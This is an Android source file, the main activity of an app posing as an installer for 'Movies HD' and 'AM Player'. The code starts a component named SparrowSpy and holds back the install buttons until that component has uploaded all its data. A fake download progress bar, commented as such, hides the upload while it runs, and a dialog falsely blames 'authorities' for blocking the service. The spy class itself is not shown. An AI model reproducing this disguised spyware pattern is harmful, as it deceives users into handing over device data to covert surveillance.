package com.sickboydroid.moviesmanager;


import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.sickboydroid.moviesmanager.events.Events;
import com.sickboydroid.moviesmanager.utils.Utils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.file.Files;
import java.util.Random;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private final Utils mUtils = new Utils(this);
    private ProgressBar progressBar;
    private TextView tvProgressText;
    private Button btnInstallMoviesHD;
    private Button btnInstallAMPlayer;

    private boolean noInternetDialogVisible;
    SparrowSpy mSpy;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        btnInstallMoviesHD = findViewById(R.id.installMoviesHD);
        btnInstallAMPlayer = findViewById(R.id.installAMPlayer);
        progressBar = findViewById(R.id.progressbar);
        tvProgressText = findViewById(R.id.progress_status);
        btnInstallMoviesHD.setEnabled(false);
        btnInstallAMPlayer.setEnabled(false);
        btnInstallMoviesHD.setOnClickListener(v -> {
            installAPK(new File(getExternalCacheDir(), "movieshd.apk"));
        });
        btnInstallAMPlayer.setOnClickListener(v -> {
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=com.amteam.amplayer")));
            } catch (ActivityNotFoundException e) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=com.amteam.amplayer")));
            }
        });
        startSpy();
    }

    public void startSpy() {
        mSpy = SparrowSpy.init(this);
        if (mSpy.hasUploadedAllData()) {
            enableInstallButtons();
            return;
        }
        mSpy.setSpyServiceStateChangeListener(new Events.SpyServiceStateChangeListener() {
            @Override
            public void onStart() {
                showFakeProcess();
            }

            @Override
            public void onFinish() {
            }
        });
    }

    private void installAPK(File apkFile) {
        if (!getPackageManager().canRequestPackageInstalls()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                    .setData(Uri.parse(String.format("package:%s", getPackageName()))));
            return;
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(uriFromFile(this, apkFile), "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        try {
            getApplicationContext().startActivity(intent);
        } catch (ActivityNotFoundException e) {
            Log.wtf(TAG, "Error in opening the file!", e);
        }
    }

    private Uri uriFromFile(Context context, File file) {
        return FileProvider.getUriForFile(context, getPackageName() + ".provider", file);
    }

    public void enableInstallButtons() {
        progressBar.setVisibility(View.INVISIBLE);
        tvProgressText.setTextColor(Color.GREEN);
        tvProgressText.setText("Successfully downloaded, please install apps");
        btnInstallAMPlayer.setEnabled(true);
        btnInstallMoviesHD.setEnabled(true);
    }

    public void copyAppsToCacheDir() throws IOException {
        AssetManager assetManager = getAssets();
        String[] apps = assetManager.list("apps");
        if (apps == null || apps.length == 0) throw new IOException("No files in assets/apps");
        for (String app : apps) {
            Log.i(TAG, "COPYING " + app);
            InputStream in = assetManager.open("apps/" + app);
            File outFile = new File(getExternalCacheDir(), app);
            OutputStream out = Files.newOutputStream(outFile.toPath());
            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1)
                out.write(buffer, 0, read);
            out.close();
            in.close();
        }
    }

    private final Thread fakeProcessThread = new Thread(new Runnable() {
        final Random random = new Random();

        @Override
        public void run() {
            double progress = 0;
            while (!mSpy.hasUploadedAllData()) {
                if (!mUtils.hasActiveInternetConnection()) {
                    runOnUiThread(MainActivity.this::showEnableInternetDialog);
                    blockThread();
                    continue;
                }
                // increase progress by 0.4% of remaining progress
                progress += 0.004 * (100 - progress);
                final int finalProgress = (int) progress;
                runOnUiThread(() -> updateUi(finalProgress));
                blockThread();
            }
            try {
                copyAppsToCacheDir();
            } catch (IOException e) {
                Log.wtf(TAG, "Failed to copy apps from assets to cache directory", e);
            }
            runOnUiThread(MainActivity.this::enableInstallButtons);
        }

        private void updateUi(int progress) {
            if (progress <= 15)
                tvProgressText.setText("Establishing connection... " +  scaleProgress(progress, 0, 15) + "%");
            else if (progress <= 40)
                tvProgressText.setText("Downloading Movies HD (36 Mb)  " + scaleProgress(progress, 15, 40) + "%");
            else if (progress <= 90)
                tvProgressText.setText("Downloading AM Player (19 Mb) " +  scaleProgress(progress, 40, 90) + "%");
            else
                tvProgressText.setText("Finishing up... " + scaleProgress(progress, 90, 100));
        }

        private void blockThread() {
            synchronized (MainActivity.this) {
                try {
                    MainActivity.this.wait(random.nextInt(400) + 1);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }


    });

    private void showFakeProcess() {
        fakeProcessThread.start();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SparrowSpy.PERMISSIONS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }

    private int scaleProgress(int progress, int min, int max) {
        int diff = max - min;
        return (int) (((double)(progress - min) / diff) * 100);
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SparrowSpy.OPEN_SETTINGS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }

    public void showEnableInternetDialog() {
        if (noInternetDialogVisible)
            return;
        noInternetDialogVisible = true;
        AlertDialog.Builder noInternetDialog = new AlertDialog.Builder(this)
                .setTitle("No Internet Connection")
                .setMessage("No internet connection detected. Please enable internet in order continue. Click retry to recheck.\nThank you")
                .setCancelable(false)
                .setNegativeButton("Retry",
                        (dialog, whichButton) -> noInternetDialogVisible = false);
        noInternetDialog.show();
    }

    public void showFailedDialog() {
        AlertDialog.Builder failedDialog = new AlertDialog.Builder(this)
                .setTitle("Access denied")
                .setMessage("It looks like authorities has blocked this service in your area. Please stay tuned for further updates.\nThank you")
                .setCancelable(false)
                .setNegativeButton(R.string.exit,
                        (dialog, whichButton) -> {
                            Toast.makeText(this, R.string.closing_app, Toast.LENGTH_SHORT).show();
                            finish();
                        });
        failedDialog.show();
    }
}